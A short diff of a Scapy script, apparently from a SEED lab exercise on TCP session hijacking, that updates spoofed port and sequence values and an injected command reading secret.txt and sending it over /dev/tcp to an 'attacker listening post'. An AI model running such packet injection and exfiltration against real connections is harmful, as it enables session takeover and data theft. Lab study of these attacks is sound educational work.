@@ -3,9 +3,9 @@ from scapy.all import *
 import sys
 
 # Fill with values found during analysis
-intSourcePort = 60578
-intNextSequenceNumber = 3807779056
-intAcknowledgementValue = 2168643280
+intSourcePort = 43472
+intNextSequenceNumber = 2875128584
+intAcknowledgementValue = 665911255
 
 # Attacker listening post
 strListeningIP = "10.9.0.1"
@@ -27,7 +27,7 @@ lyrTCP = TCP(sport=intSourcePort,
              ack=intAcknowledgementValue)
 
 # Add the data we want to retrieve
-strData = "\rcat /home/seed/secret.txt > /dev/tcp/{listening_ip}/{listening_port}\r" \
+strData = "\r cat /home/seed/secret.txt > /dev/tcp/{listening_ip}/{listening_port}\r" \
           .format(listening_ip=strListeningIP, listening_port=intListeningPort)
 
 # Build the full packet and show it
